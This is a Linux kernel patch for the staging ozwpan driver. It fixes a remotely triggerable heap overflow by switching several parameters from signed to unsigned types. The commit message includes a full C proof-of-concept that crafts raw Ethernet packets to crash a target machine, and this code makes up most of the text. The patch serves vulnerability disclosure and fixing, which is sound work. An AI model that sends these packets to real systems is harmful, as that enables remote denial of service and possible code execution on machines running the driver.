@@ -1,0 +1,220 @@
+From 39a4e1c2675ab45cec548a99ad770faa769ee27a Mon Sep 17 00:00:00 2001
+From: "Jason A. Donenfeld" <Jason@zx2c4.com>
+Date: Mon, 29 May 2017 12:36:54 +0530
+Subject: ozwpan: Use unsigned ints to prevent heap overflow
+
+[ Upstream commit: b1bb5b49373b61bf9d2c73a4d30058ba6f069e4c ]
+
+Using signed integers, the subtraction between required_size and offset
+could wind up being negative, resulting in a memcpy into a heap buffer
+with a negative length, resulting in huge amounts of network-supplied
+data being copied into the heap, which could potentially lead to remote
+code execution.. This is remotely triggerable with a magic packet.
+A PoC which obtains DoS follows below. It requires the ozprotocol.h file
+from this module.
+
+=-=-=-=-=-=
+
+static int hex2num(char c)
+{
+        if (c >= '0' && c <= '9')
+                return c - '0';
+        if (c >= 'a' && c <= 'f')
+                return c - 'a' + 10;
+        if (c >= 'A' && c <= 'F')
+                return c - 'A' + 10;
+        return -1;
+}
+static int hwaddr_aton(const char *txt, uint8_t *addr)
+{
+        int i;
+        for (i = 0; i < 6; i++) {
+                int a, b;
+                a = hex2num(*txt++);
+                if (a < 0)
+                        return -1;
+                b = hex2num(*txt++);
+                if (b < 0)
+                        return -1;
+                *addr++ = (a << 4) | b;
+                if (i < 5 && *txt++ != ':')
+                        return -1;
+        }
+        return 0;
+}
+
+int main(int argc, char *argv[])
+{
+        if (argc < 3) {
+                fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
+                return 1;
+        }
+
+        uint8_t dest_mac[6];
+        if (hwaddr_aton(argv[2], dest_mac)) {
+                fprintf(stderr, "Invalid mac address.\n");
+                return 1;
+        }
+
+        int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+        if (sockfd < 0) {
+                perror("socket");
+                return 1;
+        }
+
+        struct ifreq if_idx;
+        int interface_index;
+        strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
+        if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
+                perror("SIOCGIFINDEX");
+                return 1;
+        }
+        interface_index = if_idx.ifr_ifindex;
+        if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
+                perror("SIOCGIFHWADDR");
+                return 1;
+        }
+        uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+
+        struct {
+                struct ether_header ether_header;
+                struct oz_hdr oz_hdr;
+                struct oz_elt oz_elt;
+                struct oz_elt_connect_req oz_elt_connect_req;
+        } __packed connect_packet = {
+                .ether_header = {
+                        .ether_type = htons(OZ_ETHERTYPE),
+                        .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+                        .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+                },
+                .oz_hdr = {
+                        .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+                        .last_pkt_num = 0,
+                        .pkt_num = htole32(0)
+                },
+                .oz_elt = {
+                        .type = OZ_ELT_CONNECT_REQ,
+                        .length = sizeof(struct oz_elt_connect_req)
+                },
+                .oz_elt_connect_req = {
+                        .mode = 0,
+                        .resv1 = {0},
+                        .pd_info = 0,
+                        .session_id = 0,
+                        .presleep = 35,
+                        .ms_isoc_latency = 0,
+                        .host_vendor = 0,
+                        .keep_alive = 0,
+                        .apps = htole16((1 << OZ_APPID_USB) | 0x1),
+                        .max_len_div16 = 0,
+                        .ms_per_isoc = 0,
+                        .up_audio_buf = 0,
+                        .ms_per_elt = 0
+                }
+        };
+
+        struct {
+                struct ether_header ether_header;
+                struct oz_hdr oz_hdr;
+                struct oz_elt oz_elt;
+                struct oz_get_desc_rsp oz_get_desc_rsp;
+        } __packed pwn_packet = {
+                .ether_header = {
+                        .ether_type = htons(OZ_ETHERTYPE),
+                        .ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+                        .ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+                },
+                .oz_hdr = {
+                        .control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+                        .last_pkt_num = 0,
+                        .pkt_num = htole32(1)
+                },
+                .oz_elt = {
+                        .type = OZ_ELT_APP_DATA,
+                        .length = sizeof(struct oz_get_desc_rsp)
+                },
+                .oz_get_desc_rsp = {
+                        .app_id = OZ_APPID_USB,
+                        .elt_seq_num = 0,
+                        .type = OZ_GET_DESC_RSP,
+                        .req_id = 0,
+                        .offset = htole16(2),
+                        .total_size = htole16(1),
+                        .rcode = 0,
+                        .data = {0}
+                }
+        };
+
+        struct sockaddr_ll socket_address = {
+                .sll_ifindex = interface_index,
+                .sll_halen = ETH_ALEN,
+                .sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+        };
+
+        if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+                perror("sendto");
+                return 1;
+        }
+        usleep(300000);
+        if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+                perror("sendto");
+                return 1;
+        }
+        return 0;
+}
+
+Change-Id: Ibc1a8b7baa06332b2a7fe7135c68faee1bd791d9
+Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
+Acked-by: Dan Carpenter <dan.carpenter@oracle.com>
+Cc: stable <stable@vger.kernel.org>
+Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
+Signed-off-by: Akshaya <akshayab@codeaurora.org>
+---
+ drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
+ drivers/staging/ozwpan/ozusbif.h | 4 ++--
+ 2 files changed, 6 insertions(+), 6 deletions(-)
+
+diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
+index e880452..628e4e2 100644
+--- a/drivers/staging/ozwpan/ozhcd.c
++++ b/drivers/staging/ozwpan/ozhcd.c
+@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
+ /*
+  * Context: softirq
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+-			int length, int offset, int total_size)
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
++			u8 length, u16 offset, u16 total_size)
+ {
+ 	struct oz_port *port = (struct oz_port *)hport;
+ 	struct urb *urb;
+@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+ 	if (!urb)
+ 		return;
+ 	if (status == 0) {
+-		int copy_len;
+-		int required_size = urb->transfer_buffer_length;
++		unsigned int copy_len;
++		unsigned int required_size = urb->transfer_buffer_length;
+ 
+ 		if (required_size > total_size)
+ 			required_size = total_size;
+diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
+index 4249fa3..d2a6085 100644
+--- a/drivers/staging/ozwpan/ozusbif.h
++++ b/drivers/staging/ozwpan/ozusbif.h
+@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
+ 
+ /* Confirmation functions.
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
+-	const u8 *desc, int length, int offset, int total_size);
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
++	const u8 *desc, u8 length, u16 offset, u16 total_size);
+ void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
+ 	const u8 *data, int data_len);
+ 
+-- 
+1.9.1
+
